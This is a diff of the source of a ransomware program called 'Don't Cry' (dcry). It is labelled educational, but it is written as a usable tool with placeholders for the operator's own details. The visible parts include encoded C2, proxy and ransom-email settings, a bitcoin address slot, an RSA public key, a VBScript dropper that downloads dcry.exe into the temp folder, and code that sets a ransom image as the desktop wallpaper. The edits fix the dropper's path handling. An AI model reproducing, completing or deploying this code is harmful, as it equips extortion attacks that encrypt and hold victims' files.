@@ -2,7 +2,7 @@
 #                             Don't Cry Ransomware                             #
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
 ################################################################################
-# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
+# DISCLAIMER: This is a simulated ransomware (dcry), written for cybersecurity
 # research, ethical hacking education, and malware analysis training only.
 # It mimics the behavior of real ransomware but must NOT be used for illegal or
 # unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
@@ -46,8 +46,8 @@ YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode() # Replace with your encoded URL
 # Example: encoded_url = ex42(b"https://your-tor-server.onion".encode())
 YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
 YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
-YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode()
-YOUR_DOWNLOAD_URL = dx42(b"YOUR_ENCODED_DOWNLOAD_URL").decode()
+YOUR_EMAIL_ADDRESS = dx42(b"YOUR_ENCODED_EMAIL_ADDRESS").decode() # Replace with your encoded email address
+YOUR_DOWNLOAD_URL = dx42(b"YOUR_ENCODED_DOWNLOAD_URL").decode() # Replace with your encoded download URL
 RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAnCK4qHp0Ie/ClNE4nUaN
 wa8L36BKek8FoA0+hkUsEFdl/85M8D1sMkniG7ytzATcroLT2fmBuJP+HE0GJu8T
@@ -62,7 +62,7 @@ j2i4iYNNBE/Upy5a068ENukV8FeswaZ+1bVbtivFEFKUwq2ACFRpWYTFXXsc605D
 gCnFTWHHUYN7SsuCUlWqlyHfO3W7s8NTSPm8F7uoAzRkRgpGF3WjSblJWsz9fuAw
 9uTrsCjzkyencwnXJwLxQVMCAwEAAQ==
 -----END PUBLIC KEY-----""" # Replace with your public key if needed
-VBS = f"""Option Explicit
+VBS = rf"""Option Explicit
 
 Dim url, filename, tempFolder, fullPath
 Dim wsh, xhr, ado
@@ -72,7 +72,7 @@ filename = "dcry.exe"
 
 Set wsh = CreateObject("WScript.Shell")
 tempFolder = wsh.ExpandEnvironmentStrings("%TEMP%")
-fullPath = tempFolder & "\\" & filename
+fullPath = tempFolder & "\" & filename
 
 On Error Resume Next
 Set xhr = CreateObject("MSXML2.XMLHTTP")
@@ -331,7 +331,7 @@ def change_wallpaper():
     Sakft2B3ainWDlbZK3wO/R95uEth
     """
     reg_path = r"Control Panel\Desktop"
-    with open(r"C:\windows\web\wallpaper\windows\DCry.png", "wb") as f:
+    with open(r"C:\windows\web\wallpaper\windows\dcry.png", "wb") as f:
         f.write(zlib.decompress(base64.b64decode(IMG.encode())))
     with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as reg:
         winreg.SetValueEx(
@@ -339,7 +339,7 @@ def change_wallpaper():
             "Wallpaper",
             0,
             winreg.REG_SZ,
-            r"C:\windows\web\wallpaper\windows\DCry.png",
+            r"C:\windows\web\wallpaper\windows\dcry.png",
         )
 
 
